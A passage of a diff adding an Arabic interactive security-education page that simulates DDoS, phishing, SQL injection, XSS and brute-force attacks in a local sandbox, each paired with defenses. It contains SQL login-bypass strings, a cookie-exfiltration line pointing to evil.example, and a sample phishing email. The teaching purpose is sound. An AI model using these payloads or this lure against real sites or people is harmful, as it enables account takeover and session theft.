+      <span class="cat-main"><b>الشيفرة المدسوسة</b><i dir="ltr">XSS</i><em>تعليق «بريء» ينفّذ شيفرة في متصفح كل زائر — وجلسة أحدهم تُسرق أمامك.</em></span>
+      <span class="cat-target">متصفح زوارك</span>
+      <span class="cat-sev" data-s="4"></span>
+      <span class="cat-arrow">‹</span>
+    </div>
+    <div class="cat-row" data-mod="mod-brute" tabindex="0" role="button">
+      <span class="cat-no" dir="ltr">05</span>
+      <span class="cat-main"><b>التخمين الصبور</b><i dir="ltr">BRUTE FORCE</i><em>المهاجم ليس عبقرياً — صبور فقط. والرياضيات تحسم من يفوز، بالثواني.</em></span>
+      <span class="cat-target">هويتك</span>
+      <span class="cat-sev" data-s="3"></span>
+      <span class="cat-arrow">‹</span>
+    </div>
+    <div class="cat-row" data-mod="mod-mitm" tabindex="0" role="button">
+      <span class="cat-no" dir="ltr">06</span>
+      <span class="cat-main"><b>المستمع في المنتصف</b><i dir="ltr">MITM</i><em>بينك وبين البنك عينٌ تقرأ — إلا إذا أذنتَ لها بيدك أنت.</em></span>
+      <span class="cat-target">الاتصال نفسه</span>
+      <span class="cat-sev" data-s="4"></span>
+      <span class="cat-arrow">‹</span>
+    </div>
+    <div class="cat-row teaser">
+      <span class="cat-no" dir="ltr">07</span>
+      <span class="cat-main"><em>قيد التشريح: رانسوموير · Zero-Day · هندسة اجتماعية متقدمة — المستودع ملكك: أضف التشريح القادم بنفس القالب.</em></span>
+      <span class="cat-arrow">…</span>
+    </div>
+  </section>
+
+  <!-- ============ 01 · الإغراق ============ -->
+  <section class="module" id="mod-ddos" hidden>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 01 / 06</span></div>
+    <h2 class="mod-title">الإغراق <span class="en" dir="ltr">DDoS · DoS</span></h2>
+    <p class="mod-lead">المهاجم لا يخترق شيئاً — فقط يطلب من الخادم <b>أكثر مما يستطيع</b>. اختر السلاح وحجم الجيش، اضغط الإطلاق، شاهد المورد المستهدف ينهار، ثم شغّل الدفاع المناسب لتعيد الخادم للحياة. كل ذلك في صندوق رمل محلي بالكامل.</p>
+
+    <div class="panel">
+      <div class="p-head"><span>ساحة المعركة</span><span class="p-tag" dir="ltr">LIVE</span></div>
+      <svg id="dStage" class="stage s-ok" viewBox="0 0 1200 290">
+        <g id="dTicks"></g>
+        <line x1="940" y1="60" x2="236" y2="100" class="wire"/>
+        <line x1="940" y1="92" x2="236" y2="116" class="wire"/>
+        <line x1="940" y1="124" x2="236" y2="132" class="wire"/>
+        <line x1="985" y1="235" x2="236" y2="215" class="wire"/>
+        <text x="905" y="44" class="dirhint" text-anchor="end">‹ نيران واردة</text>
+        <text x="930" y="262" class="dirhint" text-anchor="end">‹ طلبات شرعية</text>
+        <g transform="translate(170,140)">
+          <g id="dShield" style="display:none">
+            <rect x="-62" y="-76" width="124" height="152" rx="10" class="shld"/>
+            <text x="-50" y="-62" class="gtxt" dir="ltr">CDN EDGE · 10G</text>
+          </g>
+          <g id="dInner">
+            <rect x="-48" y="-62" width="96" height="124" rx="6" class="node"/>
+            <rect x="-38" y="-52" width="76" height="30" rx="2" fill="none" class="ndet"/>
+            <circle cx="30" cy="-44" r="3" class="sled"/>
+            <rect x="-38" y="-16" width="76" height="30" rx="2" fill="none" class="ndet"/>
+            <circle cx="30" cy="-8" r="3" class="sled"/>
+            <rect x="-38" y="20" width="76" height="30" rx="2" fill="none" class="ndet"/>
+            <circle cx="30" cy="28" r="3" class="sled"/>
+            <g id="dStChip" class="stChip st-ok">
+              <rect x="-46" y="-100" width="92" height="26" rx="3" class="stbox"/>
+              <text id="dStTxt" y="-82" class="stTxt">سليم</text>
+            </g>
+          </g>
+          <text x="0" y="82" class="nlab" text-anchor="middle">خادمك</text>
+          <text id="dSrvSub" x="0" y="100" class="nsub" text-anchor="middle">origin.example · أنبوب 1 Gbps مكشوف</text>
+        </g>
+        <g id="dRefl" transform="translate(620,80)" style="display:none">
+          <text x="0" y="-30" class="ft-note">«المصدر» المزيَّف = عنوان الضحية</text>
+          <rect x="-30" y="-19" width="60" height="38" rx="4" class="refl"/>
+          <text x="0" y="4" class="gtxt" text-anchor="middle" dir="ltr">DNS</text>
+          <text x="0" y="45" class="nlab" text-anchor="middle">مُنعكس DNS مفتوح</text>
+          <text x="0" y="61" class="nsub" text-anchor="middle">يردّ لأي «مصدر» — حتى مزيَّف</text>
+        </g>
+        <g id="dBotsG">
+          <text x="1055" y="24" class="nlab" text-anchor="middle">شبكة بوت — أجهزة مصابة</text>
+          <text id="dBotTxt" x="1055" y="40" class="nsub" text-anchor="middle">200 جهاز تحت الأمر</text>
+          <g id="dBots"></g>
+        </g>
+        <g id="dDos" transform="translate(1060,92)" style="display:none">
+          <rect x="-17" y="-24" width="34" height="48" rx="3" class="botbody"/>
+          <line x1="-10" y1="-14" x2="10" y2="-14" class="ndet"/>
+          <line x1="-10" y1="2" x2="10" y2="2" class="ndet"/>
+          <circle cx="8" cy="-16" r="2.5" class="botled"/>
+          <circle cx="8" cy="0" r="2.5" class="botled"/>
+          <text x="0" y="44" class="nlab" text-anchor="middle">مهاجم واحد</text>
+          <text x="0" y="60" class="nsub" text-anchor="middle">مصدر واحد — يُحجب بقاعدة واحدة</text>
+        </g>
+        <g id="dUsers"></g>
+        <text x="1085" y="284" class="nsub" text-anchor="middle">مستخدمون حقيقيون</text>
+        <g id="dPkts"></g>
+      </svg>
+      <div class="sb">
+        <span class="st t-ok" id="dSbState">الخادم: سليم</span>
+        <span id="dSbAtk" class="grn">هدوء — حركة شرعية فقط</span>
+        <span id="dSbDef">الدفاعات النشطة: 0/4</span>
+      </div>
+      <div class="vitals">
+        <div class="vit"><div class="v-name">عرض النطاق — الطلب / السعة</div><div class="v-val" id="dBw" dir="ltr">80 <small>/ 1,000 Mbps</small></div><div class="vbar"><i id="dBwB"></i></div></div>
+        <div class="vit"><div class="v-name">جدول الاتصالات — فتحات نصف مفتوحة</div><div class="v-val" id="dConn" dir="ltr">0 <small>/ 512</small></div><div class="vbar"><i id="dConnB"></i></div></div>
+        <div class="vit"><div class="v-name">المعالج — طلبات / ثانية</div><div class="v-val" id="dCpu" dir="ltr">6 <small>/ 400 req/s</small></div><div class="vbar"><i id="dCpuB"></i></div></div>
+        <div class="vit"><div class="v-name">توافر الخدمة للمستخدمين</div><div class="v-val v-grn" id="dAvail" dir="ltr">99.0<small>%</small></div><canvas id="dAvailC" class="vspark"></canvas></div>
+      </div>
+    </div>
+
+    <div class="duo">
+      <div class="panel">
+        <div class="p-head">وحدة الهجوم — أنت المهاجم الآن <span class="p-tag" dir="ltr">ATTACK</span></div>
+        <div class="cbody">
+          <div class="c-lab">النمط — من أين تأتي النيران؟</div>
+          <div class="seg" id="dMode">
+            <button data-m="dos"><b>DoS</b><i>جهاز واحد — مصدر واحد</i></button>
+            <button data-m="ddos" class="on"><b>DDoS</b><i>شبكة بوت موزّعة</i></button>
+          </div>
+          <div class="c-lab">السلاح — أي مورد نستهدف؟</div>
+          <div class="seg red" id="dVec">
+            <button data-v="syn" class="on"><b>SYN flood</b><i>جدول الاتصالات</i></button>
+            <button data-v="http"><b>HTTP flood</b><i>المعالج</i></button>
+            <button data-v="udp"><b>UDP flood</b><i>عرض النطاق</i></button>
+            <button data-v="amp"><b>تضخيم DNS</b><i>النطاق — ×35</i></button>
+          </div>
+          <div class="c-lab">حجم شبكة البوت</div>
+          <div class="slider-row" id="dSliderRow">
+            <div class="sl-head"><span class="ct" style="font-size:10.5px;color:var(--dim)">أجهزة مصابة تستجيب لأمرك</span><span class="v" id="dBotVal" dir="ltr">200</span></div>
+            <input type="range" id="dSlider" min="25" max="1000" step="25" value="200">
+          </div>
+          <button id="dLaunch">إطلاق الهجوم — محاكاة محلية</button>
+          <div id="dPower"></div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="p-head">غرفة الدفاع — وأنت المدافع <span class="p-tag" dir="ltr">DEFENSE</span></div>
+        <div id="dDefStack"></div>
+        <div class="mtx-wrap">
+          <div class="mtx-title">مصفوفة المواجهة — أي دفاع يقف أمام أي فيضان؟</div>
+          <div class="mtx" id="dMtx"></div>
+          <div class="mtx-legend">أخضر: يوقفه غالباً · كهرماني: جزئي · رمادي: لا يمسّه — مرّر فوق أي خانة للسبب.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="p-head"><span class="dot"></span><span>سجل الخادم — ما يتراءى له لحظة الغرق</span><span class="p-tag" dir="ltr">LOG</span></div>
+      <div class="logbox" id="dLog"></div>
+    </div>
+
+    <div class="panel">
+      <div class="p-head">حدود الدرس</div>
+      <div class="facts">
+        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">لا اختراق — فقط مفاضلة موارد</div><div class="f-d">SYN يملأ <b>جدول الاتصالات</b> بمصافحات لا تكتمل (SYN ثم SYN-ACK ثم… لا شيء) · HTTP ينهك <b>المعالج</b> بطلبات كاملة · UDP/التضخيم يغرق <b>الأنبوب</b> نفسه. ولهذا لا يحمي منه تشفير ولا VPN: الطوفان لا يقرأ حركتك أصلاً.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">DoS مقابل DDoS — فرق مصيري في الدفاع</div><div class="f-d"><b>DoS</b> مصدر واحد: قاعدة حجب واحدة تُنهيه (جرّب RATE-LIMIT بنمط DoS). <b>DDoS</b>: كل بوت «تحت الحد» بمفرده فيمرّ — بدّل النمط وأعد التجربة بنفس الدفاع.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">التضخيم: طاقة لا يملكها المهاجم</div><div class="f-d">استعلام صغير بـ«مصدر» مزيَّف يجعل المُنعكسات البريئة تردّ على الضحية <b>بآلاف الأضعاف</b> (Memcached بلغت ×51,000). العلاج النظامي <b>BCP38</b>: منع التزييف عند مزوّدي الخروج — مسؤولية الشبكات لا الضحايا.</div></div>
+      </div>
+      <p class="verdict"><b>الخلاصة:</b> الحرمان من الخدمة مباراة موارد: من يملك الطاقة الأكبر — المهاجم أم سلسلة الدفاع التي قبلك — يفوز. الحل دائماً «قبل» الخادم: سعة تصفية، كعكات SYN، تحديات، وتعاون الشبكات ضد التزييف. وكل دفاع هنا يوقف نوعاً واحداً — لا يوجد زر واحد يوقفها كلها.</p>
+    </div>
+    <div class="mod-end"><button class="back">‹ عودة للفهرس</button></div>
+  </section>
+
+  <!-- ============ 02 · التصيّد ============ -->
+  <section class="module" id="mod-phish" hidden>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 02 / 06</span></div>
+    <h2 class="mod-title">التصيّد الاحتيالي <span class="en" dir="ltr">PHISHING</span></h2>
+    <p class="mod-lead">أضعف حلقة في أي نظام ليست تقنية — <b>إنها أنت</b>. أمامك رسالة احتيال محبوكة بعناية تحمل <b>6 مؤشرات خداع</b>. مهمتك: اعثر عليها كلها قبل أن تضغط الرابط. مرّر فوق أي جزء يريبك واضغط عليه.</p>
+
+    <div class="ph-grid">
+      <div class="panel mail">
+        <div class="m-bar"><b>صندوق الوارد</b> <span dir="ltr">INBOX · 1 UNREAD</span></div>
+        <div class="m-head">
+          <div><span class="lbl">من:</span><span class="p-flag" data-k="sender" data-t="نطاق مُزيَّف" data-ex="‏paypa1 — الرقم «1» بدل الحرف «l»، ونطاق غريب عن الشركة تماماً. عنوان المرسل يُقرأ حرفاً حرفاً، لا بنظرة عامة.">الدعم الفني &lt;support@paypa1-secure.com&gt;</span></div>
+          <div><span class="lbl">إلى:</span>أنت</div>
+          <div class="m-subj"><span class="p-flag" data-k="urg" data-t="استعجال مصطنع" data-ex="تهديد بمهلة 24 ساعة و«تعليق نهائي»: الضغط الزمني يحرم عقلك من التحقق. أي جهة حقيقية تعطيك وقتاً وتخاطبك عبر قناتك المعتادة."><span class="m-urg-ico">!</span>عاجل: محاولة دخول مشبوهة — سيُعلَّق حسابك خلال 24 ساعة</span></div>
+        </div>
+        <div class="m-body">
+          <span class="p-flag" data-k="greet" data-t="تحية عامة بلا اسم" data-ex="«عزيزي العميل» بدل اسمك الذي تعرفه الشركة جيداً: الرسائل الجماعية لا تُخصَّص، لأن المحتال يرسلها لملايين دفعة واحدة.">عزيزي العميل،</span><br><br>
+          رصد نظامنا محاولة دخول غير معتادة إلى حسابك من دولة أخرى. حمايةً لأموالك، سيتم تعليق الحساب نهائياً ما لم تؤكد هويتك فوراً.<br><br>
+          أكّد حسابك الآن عبر الرابط الآمن:<br>
+          <span class="p-flag m-link" data-k="link" data-t="رابط مُقنَّع" data-ex="الموقع الحقيقي الذي سيفتح هو نطاق ‎.top‎ الغريب — أما «paypal.com» فمجرد اسم فرعي زخرفي قبل النطاق الحقيقي. القاعدة الذهبية: اقرأ ما بين آخر نقطتين.">https://www.paypal.com.verify-account.top/ar/login</span>
+          <div id="pLinkHint">الهدف الحقيقي عند الضغط: <b>verify-account.top</b> — كلمة «paypal.com» ليست إلا اسماً فرعياً زخرفياً داخل العنوان.</div>
+          <br>
+          ولإتمام التحقق ستحتاج إلى <span class="p-flag" data-k="pass" data-t="طلب بيانات حساسة" data-ex="لا جهة شرعية على وجه الأرض تطلب كلمة مرورك أو رقم بطاقتك كاملاً عبر رسالة — أبداً. هذا هو المؤشر القاطع الذي لا يحتاج أي خبرة تقنية.">إدخال كلمة مرورك ورقم بطاقتك كاملة</span> خلال 24 ساعة، وإلا أُغلق الحساب نهائياً.<br><br>
+          تجد تعليمات إضافية في المرفق: <span class="p-flag" data-k="att" data-t="مرفق تنفيذي" data-ex="ملف ‎.exe‎ — برنامج وليس مستنداً. البنوك لا ترسل برامج أبداً. أي مرفق تنفيذي من «جهة مالية» هو برنامج تجسس أو رانسوموير بانتظار نقرة واحدة.">تحديث_الأمان.exe‏ (2.1 MB)</span><br><br>
+          <span class="m-sig">تحياتنا،<br>فريق الدعم الفني — PayPal</span>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="p-head">ما كشفته أنت <span class="p-tag" dir="ltr">DETECTIONS</span></div>
+        <div class="p-count" id="pCount">0 <small>/ 6 مؤشرات</small></div>
+        <ul id="pList"></ul>
+        <div class="p-actions"><button class="btn" id="pReveal">كشف الباقي — أكشفني</button></div>
+        <div id="pVer"><b>ستّة من ستة — المحتال عُري تماماً.</b> لم يبقَ منه شيء: كل مؤشر كان ظاهراً في الرسالة نفسها قبل أي ضغطة. القاعدة التي تغني عن كل هذا: <b>لا شيء عاجل يستحق كلمة مرورك</b>، وعنوان الموقع الحقيقي يُكتب بيدك في تبويب جديد — لا عبر رابط أحد.</div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="p-head">حدود الدرس</div>
+      <div class="facts">
+        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">أنجح هجوم في العالم — لأنه أرخصها</div><div class="f-d">لا يحتاج ثغرات ولا خبرة: بريد جماعي يكلف فتاياً، ويعود بأرباح سرقة جلسات وحسابات. أغلب الاختراقات الكبرى المعروفة بدأت <b>برسالة واحدة ناجحة</b> لموظف واحد.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">الحماية عادة، لا برنامج</div><div class="f-d">مرّر فوق أي رابط قبل الضغط · اقرأ ما بين <b>آخر نقطتين</b> في العنوان · لا تفتح مرفقات تنفيذية · أي «استعجال» علامة احتيال · وعند الشك: <b>اكتب عنوان الموقع بيدك</b>.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">التحقق بخطوتين (MFA) يكسر أغلب السيناريو</div><div class="f-d">حتى لو سلّمت كلمة مرورك، يبقى المحتال محتاجاً جهازك/تطبيقك للتوليد. ليست حصينة (اعتراض OTP وارد)، لكنها ترفع كلفة السرقة فوق ما يستحق أغلب المحتالين.</div></div>
+      </div>
+      <p class="verdict"><b>الخلاصة:</b> التصيّد ليس هجوماً على التقنية بل على الانتباه: كل المؤشرات كانت ظاهرة في الرسالة قبل أول نقرة — من يتعلم قراءتها يصبح أصعب هدف في القائمة، والمحتال بطبعه يبحث عن الأسهل.</p>
+    </div>
+    <div class="mod-end"><button class="back">‹ عودة للفهرس</button></div>
+  </section>
+
+  <!-- ============ 03 · الحقن ============ -->
+  <section class="module" id="mod-sqli" hidden>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 03 / 06</span></div>
+    <h2 class="mod-title">الاستعلام الخائن <span class="en" dir="ltr">SQL INJECTION</span></h2>
+    <p class="mod-lead">نموذج دخول بريء + استعلام يُبنى <b>بلصق النصوص</b> = باب خلفي مفتوح. اكتب في حقل المستخدم: <b class="mono" dir="ltr">admin' --</b> ثم اضغط دخول — وراقب سطر الاستعلام يتحول حرفاً حرفاً أمامك. بعد ذلك شغّل العلاج القطعي وراقب الحقن نفسه يتحول إلى نصٍّ بلا معنى.</p>
+
+    <div class="sq-grid">
+      <div class="panel">
+        <div class="p-head">نموذج دخول — بنك المستقبل <span class="p-tag" dir="ltr">LOGIN · MOCK</span></div>
+        <div class="form-row"><label>اسم المستخدم</label><input type="text" id="sqU" dir="ltr" placeholder="admin"></div>
+        <div class="form-row"><label>كلمة المرور</label><input type="text" id="sqP" dir="ltr" placeholder="••••••••"></div>
+        <div class="form-actions">
+          <button class="btn on" id="sqGo">دخول</button>
+          <button class="btn" id="sqPre1" dir="ltr">admin' --</button>
+          <button class="btn" id="sqPre2" dir="ltr">' OR '1'='1' --</button>
+          <button class="btn" id="sqClr">مسح</button>
+        </div>
+        <div class="qbox">
+          <div class="q-head">الاستعلام المبني حياً
+            <span class="hint">السطر الذي يُرسل فعلاً إلى قاعدة البيانات</span>
+            <div class="sw" id="sqDefSw" title="استعلامات مُعاملات (Parameterized)"><i></i></div>
+          </div>
+          <div id="sqQ"></div>
+          <div id="sqParams"></div>
+        </div>
+        <div id="sqRes"></div>
+      </div>
+      <div class="panel">
+        <div class="p-head">جدول users — ما يحرسه الخادم <span class="p-tag" dir="ltr">DATABASE</span></div>
+        <table class="sq-t">
+          <thead><tr><th>USER</th><th>PASS_HASH</th><th>BALANCE</th></tr></thead>
+          <tbody id="sqTable">
+            <tr data-u="admin"><td>admin</td><td class="mono">$2b$12$K9…</td><td class="mono">14,200</td></tr>
+            <tr data-u="sara"><td>sara</td><td class="mono">$2b$12$Q3…</td><td class="mono">3,850</td></tr>
+            <tr data-u="omar"><td>omar</td><td class="mono">$2b$12$Z7…</td><td class="mono">910</td></tr>
+          </tbody>
+        </table>
+        <div class="cbody" style="padding-top:14px">
+          <div class="c-lab" style="margin-top:0">كيف يفكر المهاجم؟</div>
+          <div class="d-desc" style="color:var(--mut);font-size:12px;line-height:1.9;font-weight:300">
+            النموذج البريء يبني: <span class="mono" style="color:var(--red);direction:ltr;unicode-bidi:embed">WHERE user='[ما تكتبه]'</span> —
+            فماذا لو كتبتَ علامة اقتباس؟ نصّك يخرج من «قيمة» إلى «شيفرة»: <span class="mono" dir="ltr">'</span> يغلق النص،
+            <span class="mono" dir="ltr">--</span> يعلّق ما بعده (شرط كلمة المرور كله!)، و<span class="mono" dir="ltr">OR 1=1</span>
+            يجعل الشرط صحيحاً لكل صف. جرّب الأزرار الجاهزة، ثم فعّل المفتاح فوق وراقب الفرق الجذري.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="p-head">حدود الدرس</div>
+      <div class="facts">
+        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">السبب دائماً واحد: لصق النصوص</div><div class="f-d">حين يُبنى الاستعلام بضمّ سلاسل نصية، يصبح <b>مدخل المستخدم جزءاً من الشيفرة</b> — وكل ما بعلامة الاقتباس صلاحيةً له. الحادثة ليست «اختراقاً ذكياً» بل تطبيقاً أهمل فصل البيان عن الأمر.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">العلاج القطعي موجود منذ عقود</div><div class="f-d"><b>الاستعلامات المُعاملات (Parameterized)</b>: القالب يُرسل أولاً، والقيم تُحمَّل لاحقاً كبيانات خام لا تُفسَّر مهما احتوت — الحقن يستحيل بنيوياً، لا «يصعب». هذا هو الفرق بين الترقيع والعلاج.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">سجل حافل بالفضائح</div><div class="f-d">من أبرز أسباب تسريب <b>ملايين السجلات</b> تاريخياً، وحاضر دائم في <b>OWASP Top 10</b> منذ أول قائمة 2003 — ليس لأن العلاج صعب، بل لأن الأنظمة القديمة أوسع من همّ من يصونها.</div></div>
+      </div>
+      <p class="verdict"><b>الخلاصة:</b> الحقن لا ينجح لأن المهاجم عبقري، بل لأن التطبيق سأل قاعدة بياناته: «نفّذ هذا النص». المُعاملات تفصل البيان عن الشيفرة فصلاً نهائياً — ما يكتبه المستخدم يبقى بيانات للأبد. اختبر بنفسك أعلاه: نفس الحقن، نفس الزر، ونتيجتان متناقضتان تماماً بفرق مفتاح واحد.</p>
+    </div>
+    <div class="mod-end"><button class="back">‹ عودة للفهرس</button></div>
+  </section>
+
+  <!-- ============ 04 · XSS ============ -->
+  <section class="module" id="mod-xss" hidden>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 04 / 06</span></div>
+    <h2 class="mod-title">الشيفرة المدسوسة <span class="en" dir="ltr">XSS</span></h2>
+    <p class="mod-lead">الموقع يعرض ما يكتبه الزوار — فماذا لو كان «ما يُكتب» <b>شيفرة</b>؟ انشر تعليقاً يحمل حقنة وشاهد جلسة زائر بريء تُسرق أمامك، ثم فعّل «تصريف المخرجات» وشاهد <b>نفس الحقنة</b> تتحول إلى حبرٍ بلا ناب. البيئة وهمية بالكامل داخل صفحتك.</p>
+
+    <div class="duo">
+      <div class="panel">
+        <div class="p-head">ساحة تعليقات متجر (وهمية)
+          <span class="p-tag" dir="ltr">COMMENT BOARD</span>
+          <div class="grp" style="display:flex;align-items:center;gap:8px;margin-inline-start:12px">
+            <span class="hint">تصريف المخرجات + CSP</span>
+            <div class="sw" id="xDefSw"><i></i></div>
+          </div>
+        </div>
+        <div class="x-cmt"><input type="text" id="xIn" placeholder="اكتب تعليقاً… (جرّب كتابة شيفرة HTML)"></div>
+        <div class="x-actions">
+          <button class="btn on" id="xGo">نشر</button>
+          <button class="btn" id="xPre">جرّب حقنة جاهزة</button>
+        </div>
+        <div id="xAlert"><div class="xa-ico">!</div><div class="xa-body"><b>شُغِّلت الشيفرة في متصفح زائر بريء</b><span>document.cookie → evil.example</span><div style="font-size:11.5px;color:var(--mut);margin-top:6px;line-height:1.8">كل من يفتح الصفحة الآن ينفّذها في متصفحه هو — الموقع لم يُخترق، لكنه صار منصّة تنفيذ للمهاجم.</div></div></div>
+        <ul id="xList"></ul>
+      </div>
+      <div class="panel">
+        <div class="p-head"><span class="dot"></span><span>المهاجم يرقب غنائمه</span><span class="p-tag" dir="ltr">ATTACKER</span></div>
+        <div class="x-loot">
+          <div class="t">جلسات مسروقة: <span id="xCount" dir="ltr">0</span></div>
+          <div id="xLoot"><span class="chipx c-dim">لا شيء بعد — انشر حقنة بلا دفاع</span></div>
+        </div>
+        <div class="cbody">
+          <div class="c-lab" style="margin-top:0">لماذا الجلسة هي الغنيمة؟</div>
+          <div class="d-desc" style="font-size:12px;line-height:1.9">كوكي الجلسة هو «بطاقة هويتك» المؤقتة لدى الموقع: من يمسكها يدخل حسابك <b>بلا كلمة مرور أصلاً</b>. لهذا يُحمى بعلم <span class="mono" dir="ltr">HttpOnly</span> الذي يحجبه حتى عن جافاسكربت الصفحة — فيبقى خارج متناول الحقنة حتى لو نُفِّذت.</div>
+          <div class="c-lab">خط الدفاع الثاني: CSP</div>
+          <div class="d-desc" style="font-size:12px;line-height:1.9">سياسة أمان المحتوى تُعلن مسبقاً ما يجوز للصفحة تحميله ومن أين — فحتى حقنة ناجحة لا تستطيع الاتصال بخادم المهاجم: <b>سرقة بلا قناة تهريب</b>.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="p-head">حدود الدرس</div>
+      <div class="facts">
+        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">الضحية ليس الموقع — بل متصفح زائر آخر</div><div class="f-d">الموقع يعمل سليماً تماماً؛ فقط صار <b>ينفّذ شيفرة الغير في سياقه هو</b>: باسم نطاقه، وبصلاحيات جلسة من يقرأه. هذا ما يجعل XSS أخطر ما يبدو «شكلياً».</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">العلاج الأول: تصريف المخرجات حسب سياقها</div><div class="f-d">كل نص يخرج للمتصفح يُحوَّل رموزه الخاصة (<span class="mono" dir="ltr">&lt; &gt; &amp;</span>) إلى كيانات نصية — فيُعرض <span class="mono" dir="ltr">&lt;script&gt;</span> ككلامٍ مطبوع لا كأمر. القاعدة: <b>تصريف عند المخرج</b>، لا «تنظيف عند المدخل» — فالسياقات كثيرة والمصائد أكثر.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">أنواعه الثلاثة في سطر</div><div class="f-d"><b>منعكس</b>: الحقنة في الرابط نفسه ترتد بالصفحة · <b>مخزَّن</b>: تُحفظ في قاعدة البيانات وتضرب كل زائر (الأشرس) · <b>DOM</b>: تعمل في المتصفح فقط عبر معالجة JavaScript للرابط. جرّبتَ أعلاه النوع المخزَّن.</div></div>
+      </div>
+      <p class="verdict"><b>الخلاصة:</b> XSS ليس هجوماً على موقعك بقدر ما هو استئجارٍ له: منصة موثوقة تنفّذ شيفرة المهاجم في متصفحات زوارها أنت. العلاج مزدوج دائماً — تصريف كل مخرج حسب سياقه، وCSP تقطع قنوات التهريب — والجلسات تُحمى بـ HttpOnly. جرّب أعلاه: نفس الحقنة، مفتاح واحد، عالمان مختلفان.</p>
+    </div>
+    <div class="mod-end"><button class="back">‹ عودة للفهرس</button></div>
+  </section>
+
+  <!-- ============ 05 · التخمين ============ -->
+  <section class="module" id="mod-brute" hidden>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 05 / 06</span></div>
+    <h2 class="mod-title">التخمين الصبور <span class="en" dir="ltr">BRUTE FORCE</span></h2>
+    <p class="mod-lead">لا عبقرية هنا — فقط <b>صبر ورياضيات</b>. أولاً قِس مقاومة كلمة مرورك بالأرقام (الحساب محلي، لا يغادر المتصفح). ثم شاهد هجوماً حياً على رقم سري من 4 خانات: مرة بلا قفل ينهار في دقيقة، ومرة بقفل بسيط يتحول إلى ساعات.</p>
+
+    <div class="duo">
+      <div class="panel">
+        <div class="p-head">حاسبة مقاومة كلمة المرور <span class="p-tag" dir="ltr">LOCAL ONLY</span></div>
+        <div class="cbody">
+          <div class="c-lab" style="margin-top:0">اكتب كلمة مرور تجريبية — الحساب كله في متصفحك</div>
+          <input type="password" id="bPw" dir="ltr" placeholder="اكتب هنا…">
+          <div class="b-big" id="bBits" style="padding:14px 0 2px">— <small>bits من العشوائية</small></div>
+          <div class="b-sub" id="bSub">الطول وتنوّع الحروف يحددان حجم فضاء البحث</div>
+          <div class="b-rows" id="bRows">
+            <div class="b-row"><span class="k">مهاجم متصل بموقع<i>مقيّد — 100 محاولة/ثانية</i></span><div class="b-bar"><i id="bB1"></i></div><span class="v" id="bV1">—</span></div>
+            <div class="b-row"><span class="k">كرت رسوميات واحد<i>تسرّب تجزئة — 10¹¹ محاولة/ثانية</i></span><div class="b-bar"><i id="bB2"></i></div><span class="v" id="bV2">—</span></div>
+            <div class="b-row"><span class="k">شبكة سرقة كاملة<i>10¹⁴ محاولة/ثانية</i></span><div class="b-bar"><i id="bB3"></i></div><span class="v" id="bV3">—</span></div>
+          </div>
+          <div class="b-sub" style="padding-top:8px">تنبيه واقعي: القواميس تُجرَّب <b>قبل</b> القوة الغاشمة — «P@ssw0rd» ليست قوية رغم رموزها.</div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="p-head">مختبر الرقم السري — هجوم حي على PIN من 4 خانات
+          <span class="p-tag" dir="ltr">LIVE</span>
+          <div class="grp" style="display:flex;align-items:center;gap:8px;margin-inline-start:12px">
+            <span class="hint">قفل بعد 5 محاولات</span>
+            <div class="sw on" id="bDefSw"><i></i></div>
+          </div>
+        </div>
+        <div class="pin-row">
+          <div class="pin-cell"><span class="k">المحاولات</span><span class="v" id="bTries" dir="ltr">0</span></div>
+          <div class="pin-cell"><span class="k">جاري تجربة</span><span class="v hot" id="bGuess" dir="ltr">----</span></div>
+          <div class="pin-cell"><span class="k">حالة القفل</span><span class="v" id="bLock" dir="ltr">—</span></div>
+          <div class="pin-cell"><span class="k">زمن العرض (مسرَّع)</span><span class="v" id="bElap" dir="ltr">0s</span></div>
+        </div>
+        <div class="pin-bar"><i id="bCov"></i></div>
+        <div id="bEta">شريط التغطية: نسبة فضاء الـ 10,000 احتمال المستنفد. اضغط «بدء الهجوم» — ثم جرّب إطفاء القفل أثناء الهجوم وقارن.</div>
+        <div class="pin-actions">
+          <button class="btn" id="bStart">بدء الهجوم</button>
+          <button class="btn" id="bReset">رقم جديد وإعادة</button>
+        </div>
+        <div id="bFound"></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="p-head">حدود الدرس</div>
+      <div class="facts">
+        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">القوة أُسّية، لا خطية</div><div class="f-d">كل حرف إضافي يضاعف الفضاء كاملاً: كلمة من 8 أحرف صغيرة = 208 مليار احتمال؛ أضف حرفين ورموزاً فتصير <b>أصعب بآلاف الأضعاف</b>. حروف طويلة عشوائية (عبارة جملة!) تهزم رموزاً قصيرة.</div></div>
